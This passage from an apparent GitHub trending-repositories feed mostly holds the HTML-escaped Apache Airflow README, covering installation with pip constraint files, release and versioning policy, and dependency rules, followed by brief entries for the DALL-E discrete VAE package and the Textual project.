&lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/scheduler.html&#34;&gt;Scheduler docs&lt;/a&gt;. MariaDB is not tested/recommended.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: SQLite is used in Airflow tests. Do not use it in production. We recommend using the latest stable version of SQLite for local development.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Support for Python v3.10 will be available from Airflow 2.3.0. The &lt;code&gt;main&lt;/code&gt; (development) branch already supports Python 3.10.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: Airflow currently can be run on POSIX-compliant Operating Systems. For development it is regularly tested on fairly modern Linux Distros and recent versions of MacOS. On Windows you can run it via WSL2 (Windows Subsystem for Linux 2) or via Linux Containers. The work to add Windows support is tracked via &lt;a href=&#34;https://github.com/apache/airflow/issues/10388&#34;&gt;#10388&lt;/a&gt; but it is not a high priority. You should only use Linux-based distros as &#34;Production&#34; execution environment as this is the only environment that is supported. The only distro that is used in our CI tests and that is used in the &lt;a href=&#34;https://hub.docker.com/p/apache/airflow&#34;&gt;Community managed DockerHub image&lt;/a&gt; is &lt;code&gt;Debian Bullseye&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Getting started&lt;/h2&gt; &#xA;&lt;p&gt;Visit the official Airflow website documentation (latest &lt;strong&gt;stable&lt;/strong&gt; release) for help with &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/installation.html&#34;&gt;installing Airflow&lt;/a&gt;, &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/start/index.html&#34;&gt;getting started&lt;/a&gt;, or walking through a more complete &lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/tutorial.html&#34;&gt;tutorial&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Note: If you&#39;re looking for documentation for the main branch (latest development branch): you can find it on &lt;a href=&#34;https://s.apache.org/airflow-docs/&#34;&gt;s.apache.org/airflow-docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;For more information on Airflow Improvement Proposals (AIPs), visit the &lt;a href=&#34;https://cwiki.apache.org/confluence/display/AIRFLOW/Airflow+Improvements+Proposals&#34;&gt;Airflow Wiki&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Documentation for dependent projects like provider packages, Docker image, Helm Chart, you&#39;ll find it in &lt;a href=&#34;https://airflow.apache.org/docs/&#34;&gt;the documentation index&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Installing from PyPI&lt;/h2&gt; &#xA;&lt;p&gt;We publish Apache Airflow as &lt;code&gt;apache-airflow&lt;/code&gt; package in PyPI. Installing it however might be sometimes tricky because Airflow is a bit of both a library and application. Libraries usually keep their dependencies open, and applications usually pin them, but we should do neither and both simultaneously. We decided to keep our dependencies as open as possible (in &lt;code&gt;setup.py&lt;/code&gt;) so users can install different versions of libraries if needed. This means that &lt;code&gt;pip install apache-airflow&lt;/code&gt; will not work from time to time or will produce unusable Airflow installation.&lt;/p&gt; &#xA;&lt;p&gt;To have repeatable installation, however, we keep a set of &#34;known-to-be-working&#34; constraint files in the orphan &lt;code&gt;constraints-main&lt;/code&gt; and &lt;code&gt;constraints-2-0&lt;/code&gt; branches. We keep those &#34;known-to-be-working&#34; constraints files separately per major/minor Python version. You can use them as constraint files when installing Airflow from PyPI. Note that you have to specify correct Airflow tag/version/branch and Python versions in the URL.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Installing just Airflow:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Note: Only &lt;code&gt;pip&lt;/code&gt; installation is currently officially supported.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;While it is possible to install Airflow with tools like &lt;a href=&#34;https://python-poetry.org&#34;&gt;Poetry&lt;/a&gt; or &lt;a href=&#34;https://pypi.org/project/pip-tools&#34;&gt;pip-tools&lt;/a&gt;, they do not share the same workflow as &lt;code&gt;pip&lt;/code&gt; - especially when it comes to constraint vs. requirements management. Installing via &lt;code&gt;Poetry&lt;/code&gt; or &lt;code&gt;pip-tools&lt;/code&gt; is not currently supported.&lt;/p&gt; &#xA;&lt;p&gt;If you wish to install Airflow using those tools, you should use the constraint files and convert them to the appropriate format and workflow that your tool requires.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip install &#39;apache-airflow==2.3.1&#39; \&#xA; --constraint &#34;https://raw.githubusercontent.com/apache/airflow/constraints-2.3.1/constraints-3.7.txt&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Installing with extras (i.e., postgres, google)&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pip install &#39;apache-airflow[postgres,google]==2.3.1&#39; \&#xA; --constraint &#34;https://raw.githubusercontent.com/apache/airflow/constraints-2.3.1/constraints-3.7.txt&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For information on installing provider packages, check &lt;a href=&#34;http://airflow.apache.org/docs/apache-airflow-providers/index.html&#34;&gt;providers&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Official source code&lt;/h2&gt; &#xA;&lt;p&gt;Apache Airflow is an &lt;a href=&#34;https://www.apache.org&#34;&gt;Apache Software Foundation&lt;/a&gt; (ASF) project, and our official source code releases:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Follow the &lt;a href=&#34;https://www.apache.org/legal/release-policy.html&#34;&gt;ASF Release Policy&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Can be downloaded from &lt;a href=&#34;https://downloads.apache.org/airflow&#34;&gt;the ASF Distribution Directory&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Are cryptographically signed by the release manager&lt;/li&gt; &#xA; &lt;li&gt;Are officially voted on by the PMC members during the &lt;a href=&#34;https://www.apache.org/legal/release-policy.html#release-approval&#34;&gt;Release Approval Process&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Following the ASF rules, the source packages released must be sufficient for a user to build and test the release provided they have access to the appropriate platform and tools.&lt;/p&gt; &#xA;&lt;h2&gt;Convenience packages&lt;/h2&gt; &#xA;&lt;p&gt;There are other ways of installing and using Airflow. Those are &#34;convenience&#34; methods - they are not &#34;official releases&#34; as stated by the &lt;code&gt;ASF Release Policy&lt;/code&gt;, but they can be used by the users who do not want to build the software themselves.&lt;/p&gt; &#xA;&lt;p&gt;Those are - in the order of most common ways people install Airflow:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pypi.org/project/apache-airflow/&#34;&gt;PyPI releases&lt;/a&gt; to install Airflow using standard &lt;code&gt;pip&lt;/code&gt; tool&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://hub.docker.com/r/apache/airflow&#34;&gt;Docker Images&lt;/a&gt; to install airflow via &lt;code&gt;docker&lt;/code&gt; tool, use them in Kubernetes, Helm Charts, &lt;code&gt;docker-compose&lt;/code&gt;, &lt;code&gt;docker swarm&lt;/code&gt;, etc. You can read more about using, customising, and extending the images in the &lt;a href=&#34;https://airflow.apache.org/docs/docker-stack/index.html&#34;&gt;Latest docs&lt;/a&gt;, and learn details on the internals in the &lt;a href=&#34;https://github.com/apache/airflow/raw/main/IMAGES.rst&#34;&gt;IMAGES.rst&lt;/a&gt; document.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/apache/airflow/tags&#34;&gt;Tags in GitHub&lt;/a&gt; to retrieve the git project sources that were used to generate official source packages via git&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;All those artifacts are not official releases, but they are prepared using officially released sources. Some of those artifacts are &#34;development&#34; or &#34;pre-release&#34; ones, and they are clearly marked as such following the ASF Policy.&lt;/p&gt; &#xA;&lt;h2&gt;User Interface&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;DAGs&lt;/strong&gt;: Overview of all DAGs in your environment.&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/img/dags.png&#34; alt=&#34;DAGs&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Grid&lt;/strong&gt;: Grid representation of a DAG that spans across time.&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/img/grid.png&#34; alt=&#34;Grid&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Graph&lt;/strong&gt;: Visualization of a DAG&#39;s dependencies and their current status for a specific run.&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/img/graph.png&#34; alt=&#34;Graph&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Task Duration&lt;/strong&gt;: Total time spent on different tasks over time.&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/img/duration.png&#34; alt=&#34;Task Duration&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Gantt&lt;/strong&gt;: Duration and overlap of a DAG.&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/img/gantt.png&#34; alt=&#34;Gantt&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Code&lt;/strong&gt;: Quick way to view source code of a DAG.&lt;/p&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/img/code.png&#34; alt=&#34;Code&#34;&gt;&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Semantic versioning&lt;/h2&gt; &#xA;&lt;p&gt;As of Airflow 2.0.0, we support a strict &lt;a href=&#34;https://semver.org/&#34;&gt;SemVer&lt;/a&gt; approach for all packages released.&lt;/p&gt; &#xA;&lt;p&gt;There are few specific rules that we agreed to that define details of versioning of the different packages:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;Airflow&lt;/strong&gt;: SemVer rules apply to core airflow only (excludes any changes to providers). Changing limits for versions of Airflow dependencies is not a breaking change on its own.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Airflow Providers&lt;/strong&gt;: SemVer rules apply to changes in the particular provider&#39;s code only. SemVer MAJOR and MINOR versions for the packages are independent of the Airflow version. For example, &lt;code&gt;google 4.1.0&lt;/code&gt; and &lt;code&gt;amazon 3.0.3&lt;/code&gt; providers can happily be installed with &lt;code&gt;Airflow 2.1.2&lt;/code&gt;. If there are limits of cross-dependencies between providers and Airflow packages, they are present in providers as &lt;code&gt;install_requires&lt;/code&gt; limitations. We aim to keep backwards compatibility of providers with all previously released Airflow 2 versions but there will sometimes be breaking changes that might make some, or all providers, have minimum Airflow version specified. Change of that minimum supported Airflow version is a breaking change for provider because installing the new provider might automatically upgrade Airflow (which might be an undesired side effect of upgrading provider).&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Airflow Helm Chart&lt;/strong&gt;: SemVer rules apply to changes in the chart only. SemVer MAJOR and MINOR versions for the chart are independent from the Airflow version. We aim to keep backwards compatibility of the Helm Chart with all released Airflow 2 versions, but some new features might only work starting from specific Airflow releases. We might however limit the Helm Chart to depend on minimal Airflow version.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Airflow API clients&lt;/strong&gt;: SemVer MAJOR and MINOR versions follow MAJOR and MINOR versions of Airflow. The first MAJOR or MINOR X.Y.0 release of Airflow should always be followed by X.Y.0 release of all clients. The clients then can release their own PATCH releases with bugfixes, independently of Airflow PATCH releases.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Version Life Cycle&lt;/h2&gt; &#xA;&lt;p&gt;Apache Airflow version life cycle:&lt;/p&gt; &#xA;&lt;!-- This table is automatically updated by pre-commit scripts/ci/pre_commit/pre_commit_supported_versions.py --&gt; &#xA;&lt;!-- Beginning of auto-generated table --&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Version&lt;/th&gt; &#xA;   &lt;th&gt;Current Patch/Minor&lt;/th&gt; &#xA;   &lt;th&gt;State&lt;/th&gt; &#xA;   &lt;th&gt;First Release&lt;/th&gt; &#xA;   &lt;th&gt;Limited Support&lt;/th&gt; &#xA;   &lt;th&gt;EOL/Terminated&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2&lt;/td&gt; &#xA;   &lt;td&gt;2.3.1&lt;/td&gt; &#xA;   &lt;td&gt;Supported&lt;/td&gt; &#xA;   &lt;td&gt;Dec 17, 2020&lt;/td&gt; &#xA;   &lt;td&gt;TBD&lt;/td&gt; &#xA;   &lt;td&gt;TBD&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;1.10&lt;/td&gt; &#xA;   &lt;td&gt;1.10.15&lt;/td&gt; &#xA;   &lt;td&gt;EOL&lt;/td&gt; &#xA;   &lt;td&gt;Aug 27, 2018&lt;/td&gt; &#xA;   &lt;td&gt;Dec 17, 2020&lt;/td&gt; &#xA;   &lt;td&gt;June 17, 2021&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;1.9&lt;/td&gt; &#xA;   &lt;td&gt;1.9.0&lt;/td&gt; &#xA;   &lt;td&gt;EOL&lt;/td&gt; &#xA;   &lt;td&gt;Jan 03, 2018&lt;/td&gt; &#xA;   &lt;td&gt;Aug 27, 2018&lt;/td&gt; &#xA;   &lt;td&gt;Aug 27, 2018&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;1.8&lt;/td&gt; &#xA;   &lt;td&gt;1.8.2&lt;/td&gt; &#xA;   &lt;td&gt;EOL&lt;/td&gt; &#xA;   &lt;td&gt;Mar 19, 2017&lt;/td&gt; &#xA;   &lt;td&gt;Jan 03, 2018&lt;/td&gt; &#xA;   &lt;td&gt;Jan 03, 2018&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;1.7&lt;/td&gt; &#xA;   &lt;td&gt;1.7.1.2&lt;/td&gt; &#xA;   &lt;td&gt;EOL&lt;/td&gt; &#xA;   &lt;td&gt;Mar 28, 2016&lt;/td&gt; &#xA;   &lt;td&gt;Mar 19, 2017&lt;/td&gt; &#xA;   &lt;td&gt;Mar 19, 2017&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;!-- End of auto-generated table --&gt; &#xA;&lt;p&gt;Limited support versions will be supported with security and critical bug fix only. EOL versions will not get any fixes nor support. We always recommend that all users run the latest available minor release for whatever major version is in use. We &lt;strong&gt;highly&lt;/strong&gt; recommend upgrading to the latest Airflow major release at the earliest convenient time and before the EOL date.&lt;/p&gt; &#xA;&lt;h2&gt;Support for Python and Kubernetes versions&lt;/h2&gt; &#xA;&lt;p&gt;As of Airflow 2.0, we agreed to certain rules we follow for Python and Kubernetes support. They are based on the official release schedule of Python and Kubernetes, nicely summarized in the &lt;a href=&#34;https://devguide.python.org/#status-of-python-branches&#34;&gt;Python Developer&#39;s Guide&lt;/a&gt; and &lt;a href=&#34;https://kubernetes.io/docs/setup/release/version-skew-policy/&#34;&gt;Kubernetes version skew policy&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt; &lt;p&gt;We drop support for Python and Kubernetes versions when they reach EOL. Except for kubernetes, a version stay supported by Airflow if two major cloud provider still provide support for it. We drop support for those EOL versions in main right after EOL date, and it is effectively removed when we release the first new MINOR (Or MAJOR if there is no new MINOR version) of Airflow. For example, for Python 3.7 it means that we will drop support in main right after 27.06.2023, and the first MAJOR or MINOR version of Airflow released after will not have it.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The &#34;oldest&#34; supported version of Python/Kubernetes is the default one until we decide to switch to later version. &#34;Default&#34; is only meaningful in terms of &#34;smoke tests&#34; in CI PRs, which are run using this default version and the default reference image available. Currently &lt;code&gt;apache/airflow:latest&lt;/code&gt; and &lt;code&gt;apache/airflow:2.3.1&lt;/code&gt; images are Python 3.7 images. This means that default reference image will become the default at the time when we start preparing for dropping 3.7 support which is few months before the end of life for Python 3.7.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;We support a new version of Python/Kubernetes in main after they are officially released, as soon as we make them work in our CI pipeline (which might not be immediate due to dependencies catching up with new versions of Python mostly) we release new images/support in Airflow based on the working CI setup.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Base OS support for reference Airflow images&lt;/h2&gt; &#xA;&lt;p&gt;The Airflow Community provides conveniently packaged container images that are published whenever we publish an Apache Airflow release. Those images contain:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Base OS with necessary packages to install Airflow (stable Debian OS)&lt;/li&gt; &#xA; &lt;li&gt;Base Python installation in versions supported at the time of release for the MINOR version of Airflow released (so there could be different versions for 2.3 and 2.2 line for example)&lt;/li&gt; &#xA; &lt;li&gt;Libraries required to connect to suppoerted Databases (again the set of databases supported depends on the MINOR version of Airflow.&lt;/li&gt; &#xA; &lt;li&gt;Predefined set of popular providers (for details see the &lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/Dockerfile&#34;&gt;Dockerfile&lt;/a&gt;).&lt;/li&gt; &#xA; &lt;li&gt;Possibility of building your own, custom image where the user can choose their own set of providers and libraries (see &lt;a href=&#34;https://airflow.apache.org/docs/docker-stack/build.html&#34;&gt;Building the image&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;In the future Airflow might also support a &#34;slim&#34; version without providers nor database clients installed&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The version of the base OS image is the stable version of Debian. Airflow supports using all currently active stable versions - as soon as all Airflow dependencies support building, and we set up the CI pipeline for building and testing the OS version. Approximately 6 months before the end-of-life of a previous stable version of the OS, Airflow switches the images released to use the latest supported version of the OS. For example since Debian Buster end-of-life is August 2022, Airflow switches the images in &lt;code&gt;main&lt;/code&gt; branch to use Debian Bullseye in February/March 2022. The version will be used in the next MINOR release after the switch happens. In case of the Bullseye switch - 2.3.0 version will use Bullseye. The images released in the previous MINOR version continue to use the version that all other releases for the MINOR version used.&lt;/p&gt; &#xA;&lt;p&gt;Users will continue to be able to build their images using stable Debian releases until the end of life and building and verifying of the images happens in our CI but no unit tests are executed using this image in the &lt;code&gt;main&lt;/code&gt; branch.&lt;/p&gt; &#xA;&lt;h2&gt;Approach to dependencies of Airflow&lt;/h2&gt; &#xA;&lt;p&gt;Airflow has a lot of dependencies - direct and transitive, also Airflow is both - library and application, therefore our policies to dependencies has to include both - stability of installation of application, but also ability to install newer version of dependencies for those users who develop DAGs. We developed the approach where &lt;code&gt;constraints&lt;/code&gt; are used to make sure airflow can be installed in a repeatable way, while we do not limit our users to upgrade most of the dependencies. As a result we decided not to upper-bound version of Airflow dependencies by default, unless we have good reasons to believe upper-bounding them is needed because of importance of the dependency as well as risk it involves to upgrade specific dependency. We also upper-bound the dependencies that we know cause problems.&lt;/p&gt; &#xA;&lt;p&gt;The constraint mechanism of ours takes care about finding and upgrading all the non-upper bound dependencies automatically (providing that all the tests pass). Our &lt;code&gt;main&lt;/code&gt; build failures will indicate in case there are versions of dependencies that break our tests - indicating that we should either upper-bind them or that we should fix our code/tests to account for the upstream changes from those dependencies.&lt;/p&gt; &#xA;&lt;p&gt;Whenever we upper-bound such a dependency, we should always comment why we are doing it - i.e. we should have a good reason why dependency is upper-bound. And we should also mention what is the condition to remove the binding.&lt;/p&gt; &#xA;&lt;h3&gt;Approach for dependencies for Airflow Core&lt;/h3&gt; &#xA;&lt;p&gt;Those &lt;code&gt;extras&lt;/code&gt; and &lt;code&gt;providers&lt;/code&gt; dependencies are maintained in &lt;code&gt;setup.cfg&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;There are few dependencies that we decided are important enough to upper-bound them by default, as they are known to follow predictable versioning scheme, and we know that new versions of those are very likely to bring breaking changes. We commit to regularly review and attempt to upgrade to the newer versions of the dependencies as they are released, but this is manual process.&lt;/p&gt; &#xA;&lt;p&gt;The important dependencies are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;SQLAlchemy&lt;/code&gt;: upper-bound to specific MINOR version (SQLAlchemy is known to remove deprecations and introduce breaking changes especially that support for different Databases varies and changes at various speed (example: SQLAlchemy 1.4 broke MSSQL integration for Airflow)&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Alembic&lt;/code&gt;: it is important to handle our migrations in predictable and performant way. It is developed together with SQLAlchemy. Our experience with Alembic is that it very stable in MINOR version&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;Flask&lt;/code&gt;: We are using Flask as the back-bone of our web UI and API. We know major version of Flask are very likely to introduce breaking changes across those so limiting it to MAJOR version makes sense&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;werkzeug&lt;/code&gt;: the library is known to cause problems in new versions. It is tightly coupled with Flask libraries, and we should update them together&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;celery&lt;/code&gt;: Celery is crucial component of Airflow as it used for CeleryExecutor (and similar). Celery &lt;a href=&#34;https://docs.celeryq.dev/en/stable/contributing.html?highlight=semver#versions&#34;&gt;follows SemVer&lt;/a&gt;, so we should upper-bound it to the next MAJOR version. Also when we bump the upper version of the library, we should make sure Celery Provider minimum Airflow version is updated).&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;kubernetes&lt;/code&gt;: Kubernetes is a crucial component of Airflow as it is used for the KubernetesExecutor (and similar). Kubernetes Python library &lt;a href=&#34;https://github.com/kubernetes-client/python#compatibility&#34;&gt;follows SemVer&lt;/a&gt;, so we should upper-bound it to the next MAJOR version. Also when we bump the upper version of the library, we should make sure Kubernetes Provider minimum Airflow version is updated.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Approach for dependencies in Airflow Providers and extras&lt;/h3&gt; &#xA;&lt;p&gt;Those &lt;code&gt;extras&lt;/code&gt; and &lt;code&gt;providers&lt;/code&gt; dependencies are maintained in &lt;code&gt;setup.py&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;By default, we should not upper-bound dependencies for providers, however each provider&#39;s maintainer might decide to add additional limits (and justify them with comment)&lt;/p&gt; &#xA;&lt;h2&gt;Support for providers&lt;/h2&gt; &#xA;&lt;p&gt;Providers released by the community have limitation of a minimum supported version of Airflow. The minimum version of Airflow is the &lt;code&gt;MINOR&lt;/code&gt; version (2.1, 2.2 etc.) indicating that the providers might use features that appeared in this release. The default support timespan for the minimum version of Airflow (there could be justified exceptions) is that we increase the minimum Airflow version, when 12 months passed since the first release for the MINOR version of Airflow.&lt;/p&gt; &#xA;&lt;p&gt;For example this means that by default we upgrade the minimum version of Airflow supported by providers to 2.2.0 in the first Provider&#39;s release after 21st of May 2022 (21st of May 2021 is the date when the first &lt;code&gt;PATCHLEVEL&lt;/code&gt; of 2.1 (2.1.0) has been released.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Want to help build Apache Airflow? Check out our &lt;a href=&#34;https://github.com/apache/airflow/raw/main/CONTRIBUTING.rst&#34;&gt;contributing documentation&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Official Docker (container) images for Apache Airflow are described in &lt;a href=&#34;https://github.com/apache/airflow/raw/main/IMAGES.rst&#34;&gt;IMAGES.rst&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Who uses Apache Airflow?&lt;/h2&gt; &#xA;&lt;p&gt;More than 400 organizations are using Apache Airflow &lt;a href=&#34;https://github.com/apache/airflow/raw/main/INTHEWILD.md&#34;&gt;in the wild&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Who Maintains Apache Airflow?&lt;/h2&gt; &#xA;&lt;p&gt;Airflow is the work of the &lt;a href=&#34;https://github.com/apache/airflow/graphs/contributors&#34;&gt;community&lt;/a&gt;, but the &lt;a href=&#34;https://people.apache.org/committers-by-project.html#airflow&#34;&gt;core committers/maintainers&lt;/a&gt; are responsible for reviewing and merging PRs as well as steering conversations around new feature requests. If you would like to become a maintainer, please review the Apache Airflow &lt;a href=&#34;https://github.com/apache/airflow/raw/main/COMMITTERS.rst#guidelines-to-become-an-airflow-committer&#34;&gt;committer requirements&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Can I use the Apache Airflow logo in my presentation?&lt;/h2&gt; &#xA;&lt;p&gt;Yes! Be sure to abide by the Apache Foundation &lt;a href=&#34;https://www.apache.org/foundation/marks/#books&#34;&gt;trademark policies&lt;/a&gt; and the Apache Airflow &lt;a href=&#34;https://cwiki.apache.org/confluence/display/AIRFLOW/Brandbook&#34;&gt;Brandbook&lt;/a&gt;. The most up to date logos are found in &lt;a href=&#34;https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/img/logos&#34;&gt;this repo&lt;/a&gt; and on the Apache Software Foundation &lt;a href=&#34;https://www.apache.org/logos/about.html&#34;&gt;website&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Airflow merchandise&lt;/h2&gt; &#xA;&lt;p&gt;If you would love to have Apache Airflow stickers, t-shirt, etc. then check out &lt;a href=&#34;https://www.redbubble.com/i/sticker/Apache-Airflow-by-comdev/40497530.EJUG5&#34;&gt;Redbubble Shop&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Links&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://airflow.apache.org/docs/apache-airflow/stable/&#34;&gt;Documentation&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://s.apache.org/airflow-slack&#34;&gt;Chat&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Sponsors&lt;/h2&gt; &#xA;&lt;p&gt;The CI infrastructure for Apache Airflow has been sponsored by:&lt;/p&gt; &#xA;&lt;!-- Ordered by most recently &#34;funded&#34; --&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://astronomer.io&#34;&gt;&lt;img src=&#34;https://assets2.astronomer.io/logos/logoForLIGHTbackground.png&#34; alt=&#34;astronomer.io&#34; width=&#34;250px&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://aws.amazon.com/opensource/&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/apache/airflow/main/docs/integration-logos/aws/AWS-Cloud-alt_light-bg@4x.png&#34; alt=&#34;AWS OpenSource&#34; width=&#34;130px&#34;&gt;&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>openai/DALL-E</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/openai/DALL-E</id>
    <link href="https://github.com/openai/DALL-E" rel="alternate"></link>
    <summary type="html">&lt;p&gt;PyTorch package for the discrete VAE used for DALL·E.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Overview&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://openai.com/blog/dall-e/&#34;&gt;[Blog]&lt;/a&gt; &lt;a href=&#34;https://arxiv.org/abs/2102.12092&#34;&gt;[Paper]&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/openai/DALL-E/master/model_card.md&#34;&gt;[Model Card]&lt;/a&gt; &lt;a href=&#34;https://raw.githubusercontent.com/openai/DALL-E/master/notebooks/usage.ipynb&#34;&gt;[Usage]&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;This is the official PyTorch package for the discrete VAE used for DALL·E. The transformer used to generate the images from the text is not part of this code release.&lt;/p&gt; &#xA;&lt;h1&gt;Installation&lt;/h1&gt; &#xA;&lt;p&gt;Before running &lt;a href=&#34;https://raw.githubusercontent.com/openai/DALL-E/master/notebooks/usage.ipynb&#34;&gt;the example notebook&lt;/a&gt;, you will need to install the package using&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;pip install DALL-E&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>Textualize/textual</title>
    <updated>2022-05-29T01:33:11Z</updated>
    <id>tag:github.com,2022-05-29:/Textualize/textual</id>
    <link href="https://github.com/Textualize/textual" rel="alternate"></link>
